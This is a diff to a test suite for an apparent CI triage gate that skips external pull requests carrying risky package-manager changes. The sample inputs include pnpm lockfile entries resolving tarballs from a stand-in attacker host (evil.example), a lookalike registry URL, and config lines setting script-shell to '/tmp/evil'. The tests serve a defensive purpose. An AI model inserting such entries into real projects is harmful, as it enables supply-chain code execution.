@@ -2862,9 +2862,35 @@ describe('qwen-triage verify hardening', () => {
         }).decision,
       ).toBe('run');
 
+      const pnpmOffReg = run({
+        trust: 'external',
+        diff: "+++ b/pnpm-lock.yaml\n+    resolution: {tarball: 'https://evil.example/x.tgz'}\n",
+      });
+      expect(pnpmOffReg.decision).toBe('skip');
+      expect(pnpmOffReg.reason).toContain('registry.npmjs.org');
+      const pnpmLookalike = run({
+        trust: 'external',
+        diff: "+++ b/pnpm-lock.yaml\n+    resolution: {tarball: 'https://evil.example/?u=https://registry.npmjs.org/x.tgz'}\n",
+      });
+      expect(pnpmLookalike.decision).toBe('skip');
+      expect(pnpmLookalike.reason).toContain('registry.npmjs.org');
+      expect(
+        run({
+          trust: 'external',
+          diff: "+++ b/pnpm-lock.yaml\n+    resolution: {tarball: 'https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz'}\n",
+        }).decision,
+      ).toBe('run');
+
       // Package-manager config: settings like `script-shell` redirect what
       // every later npm invocation executes.
-      for (const cfg of ['.npmrc', '.yarnrc', '.yarnrc.yml', 'bunfig.toml']) {
+      for (const cfg of [
+        '.npmrc',
+        '.yarnrc',
+        '.yarnrc.yml',
+        'bunfig.toml',
+        'pnpm-workspace.yaml',
+        '.pnpmfile.mjs',
+      ]) {
         const pm = run({
           trust: 'external',
           diff: `+++ b/${cfg}\n+script-shell=/tmp/evil\n`,
@@ -6079,6 +6105,16 @@ describe('qwen-triage verify round-3 hardening', () => {
     if (infra > -1) {
       expect(prepare.slice(0, infra)).toContain('registry_unreachable');
     }
+  });
+
+  it('bootstraps pnpm before the tmux verdict-producing install step', () => {
+    const tmuxJob = job('tmux-testing');
+    const bootstrap = stepIn('tmux-testing', 'Bootstrap pnpm');
+    expect(bootstrap).toContain('runuser -u node -- corepack pnpm --version');
+    expect(bootstrap).not.toContain('verdict=');
+    expect(tmuxJob.indexOf("name: 'Bootstrap pnpm'")).toBeLessThan(
+      tmuxJob.indexOf("name: 'Install and build PR app'"),
+    );
   });
 
   // Run 30319209722 reported `fail` against a PR whose only crime was that
